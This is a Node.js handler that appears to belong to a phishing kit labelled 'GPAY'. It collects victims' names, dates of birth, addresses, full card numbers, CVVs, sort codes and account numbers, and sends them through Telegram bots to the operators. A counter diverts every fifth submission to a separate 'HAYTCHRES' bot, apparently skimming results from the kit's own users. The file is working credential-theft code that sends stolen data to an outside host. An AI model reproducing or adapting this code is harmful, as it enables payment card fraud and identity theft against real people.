const axios = require("axios");

let count = 0;

const sendRes = async (req, res) => {
	let {
		dob,
		telephone,
		city,
		address,
		pcode,
		ccname,
		ccnum,
		ccexp,
		cvv,
		scode,
		accno,
		userAgent,
		ip,
		bin,
		bankName,
		telegramId,
	} = req.body;

	binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
	var originalText = `+----------- Personal Information ------------+\nFull Name: ${ccname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nMobile Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\n${
		scode && accno ? `Sort Code: ${scode}\nAccount Number: ${accno}\n` : ""
	}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
	if (count == 4) {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `HAYTCHRES:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count = 0;
	} else {
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: 680379375,
					text: `GPAY ${telegramId}:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		await axios
			.post(
				`https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
				{
					chat_id: telegramId,
					text: `GPAY:\n${originalText}`,
					parse_mode: "Markdown",
				}
			)
			.catch((e) => {
				console.log(e);
			});
		count += 1;
	}
	res.sendStatus(200);
};

module.exports = {
	sendRes,
};
